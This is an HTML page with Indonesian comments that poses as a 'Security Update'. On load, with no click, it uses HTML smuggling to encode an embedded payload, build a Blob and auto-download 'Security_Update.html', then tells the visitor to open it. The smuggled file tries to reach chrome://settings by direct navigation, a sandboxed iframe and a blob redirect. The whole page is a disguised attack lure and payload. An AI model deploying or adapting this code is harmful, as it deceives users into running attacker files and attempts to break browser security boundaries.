<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  body { font-family: monospace; background: #111; color: #0f0; text-align: center; padding-top: 20vh; }
  iframe { display: none; }
</style>
</head>
<body>

<h1>🔒 Security Update</h1>
<p id="status">Menyiapkan file pembaruan...</p>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');

  // ============================================
  // 1. PAYLOAD INTERNAL BYPASS (DISELUNDUPKAN)
  // ============================================
  // Ini adalah file HTML yang akan diunduh (diselundupkan).
  // Saat dibuka, ia akan mencoba menembus chrome://settings.
  
  var smuggledHTML = `
    <!DOCTYPE html>
    <html>
    <head><title>System Bypass</title></head>
    <body style="background:#000;color:#fff;font-family:monospace;text-align:center;padding-top:20vh;">
      <h1>Executing Internal Bypass...</h1>
      <p id="log">Memulai...</p>
      <script>
        (function() {
          var logEl = document.getElementById('log');
          function log(msg) { logEl.innerHTML += "<br>> " + msg; }

          // Target Internal Page
          var internalUrl = "chrome://settings";

          log("Memulai bypass via file://");

          // A. Direct Navigation (Mungkin diizinkan di file://)
          setTimeout(function() {
            try {
              window.location.href = internalUrl;
              log("Direct Navigation sent.");
            } catch(e) { log("Direct fail: " + e.message); }
          }, 1000);

          // B. Iframe Sandbox
          setTimeout(function() {
            var iframe = document.createElement('iframe');
            iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
            iframe.src = internalUrl;
            iframe.style.display = "none";
            document.body.appendChild(iframe);
            log("Iframe Sandbox sent.");
          }, 2000);

          // C. Blob Wrapper (Double Jump)
          setTimeout(function() {
            try {
              var blobPayload = '<script>window.top.location.href="' + internalUrl + '";<\\/script>';
              var blob = new Blob([blobPayload], { type: 'text/html' });
              var url = URL.createObjectURL(blob);
              window.location.replace(url);
              log("Blob Wrapper sent.");
            } catch(e) {}
          }, 3000);

        })();
      <\/script>
    </body>
    </html>
  `;

  // ============================================
  // 2. FUNGSI HTML SMUGGLING (ENCODE BASE64)
  // ============================================
  function triggerSmuggling() {
    statusEl.innerText = "Merakit payload di memori...";

    try {
      // Encode payload HTML ke Base64
      var base64Payload = btoa(unescape(encodeURIComponent(smuggledHTML)));
      
      // Decode kembali ke bytes
      var binary = atob(base64Payload);
      var bytes = new Uint8Array(binary.length);
      for (var i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
      }

      // Buat Blob (MIME Type sebagai .html agar bisa dieksekusi)
      var blob = new Blob([bytes], { type: 'text/html' });
      var url = URL.createObjectURL(blob);

      // Trigger Download
      var a = document.createElement('a');
      a.href = url;
      a.download = 'Security_Update.html'; // File hasil unduhan
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();

      statusEl.innerText = "File berhasil diunduh. Silakan buka file tersebut.";

      setTimeout(function() {
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      }, 5000);

    } catch (e) {
      statusEl.innerText = "Gagal: " + e.message;
    }
  }

  // ============================================
  // 3. EKSEKUSI (ZERO-CLICK)
  // ============================================
  setTimeout(triggerSmuggling, 1000);

})();
</script>
</body>
</html>
